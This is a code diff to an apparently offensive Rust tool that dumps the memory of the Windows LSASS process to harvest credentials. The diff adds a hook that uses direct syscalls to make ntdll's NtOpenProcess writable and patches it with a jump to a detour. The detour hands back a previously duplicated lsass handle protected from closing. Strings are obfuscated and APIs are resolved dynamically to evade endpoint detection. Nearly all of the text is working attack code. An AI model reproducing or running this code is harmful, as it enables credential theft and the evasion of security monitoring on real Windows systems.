@@ -10,8 +10,9 @@ use rand::distributions::Alphanumeric;
 use core::panic;
 use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
 use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransactio, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile};
+use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransactio, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile, NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE, SetHandleInformation};
 
+static mut STATIC_HANDLE: isize = 0;
 
 // #[no_mangle]
 pub fn dump(key: &str) {
@@ -335,6 +336,14 @@ pub fn dump(key: &str) {
                                 None => {shtei = shtei.add(1); continue;},
                             }
 
+                            STATIC_HANDLE = (*dup_handle).0;
+
+                            if !hook()
+                            {
+                                println!("{}", &lc!("[x] Could not hook NtOpenProcess. Exiting."));
+                                return;
+                            }
+
                             let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
                             let func: MiniDumpWriteDump;
                             let ret: Option<i32>;
@@ -357,7 +366,7 @@ pub fn dump(key: &str) {
                                 Some(x) => 
                                     if x == 1 
                                     {
-                                        println!("{}",&lc!("[!] Lsass dump successfully created!"));
+                                        println!("{}",&lc!("[!] Lsass dump created!"));
                                         
                                         let func: GetFileSize;
                                         let ret: Option<u32>;
@@ -508,6 +517,109 @@ pub fn dump(key: &str) {
     }
 }
 
+pub fn hook () -> bool
+{
+    unsafe 
+    {
+
+        let detour_addresss: usize = std::mem::transmute(nt_open_process_detour as fn (*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32);
+
+        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
+        let handle = GetCurrentProcess();
+        let ntop_base_address = dinvoke::get_function_address(ntdll, &lc!("NtOpenProcess"));
+        let base_address: *mut PVOID = std::mem::transmute(&ntop_base_address);
+        let size = 13 as usize; // for x64 processor
+        let size: *mut usize = std::mem::transmute(&size);
+        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
+        let func: NtProtectVirtualMemory;
+        let ret: Option<i32>;
+        dinvoke::execute_syscall!(
+            &lc!("NtProtectVirtualMemory"),
+            func,
+            ret,
+            handle,
+            base_address,
+            size,
+            PAGE_EXECUTE_READWRITE,
+            old_protection
+        );
+
+        match ret {
+            Some(z) => 
+            {
+                if z != 0
+                {
+                    return false;
+                }
+            }    
+            None => {return false;},
+        }
+
+        let ntop_ptr = ntop_base_address as *mut u8;
+
+        *ntop_ptr = 0x49;
+        *(ntop_ptr.add(1)) = 0xBB;
+        *(ntop_ptr.add(2) as *mut usize) = detour_addresss;
+        *(ntop_ptr.add(10)) = 0x41;
+        *(ntop_ptr.add(11)) = 0xFF;
+        *(ntop_ptr.add(12)) = 0xE3;
+
+        let unused: *mut u32 = std::mem::transmute(&u32::default());
+        let func: NtProtectVirtualMemory;
+        let ret: Option<i32>;
+        dinvoke::execute_syscall!(
+            &lc!("NtProtectVirtualMemory"),
+            func,
+            ret,
+            handle,
+            base_address,
+            size,
+            *old_protection,
+            unused
+        );
+
+        match ret {
+            Some(z) => 
+            {
+                if z != 0
+                {
+                    return false;
+                }
+            }    
+            None => {return false;},
+        }
+
+        println!("{}", &lc!("[+] NtOpenProcess hooked."));
+
+        true
+    }
+
+}
+
+pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _object_attributes: *mut OBJECT_ATTRIBUTES, _client_id: *mut CLIENT_ID)  -> i32
+{
+    unsafe 
+    {
+        let dup_handle = HANDLE{0: STATIC_HANDLE};
+
+        let func:SetHandleInformation;
+        let _ret: Option<BOOL>;
+        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
+        dinvoke::dynamic_invoke!(
+            k32,
+            &lc!("SetHandleInformation"),
+            func,
+            _ret,
+            dup_handle,
+            0x00000002, // HANDLE_FLAG_PROTECT_FROM_CLOSE
+            0x00000002
+        );
+
+        _process_handle = std::mem::transmute(&dup_handle);//dup_handle;
+
+        0
+    }
+}
 
 pub fn decrypt (file_path: &str, key: &str, output_file: &str) 
 {
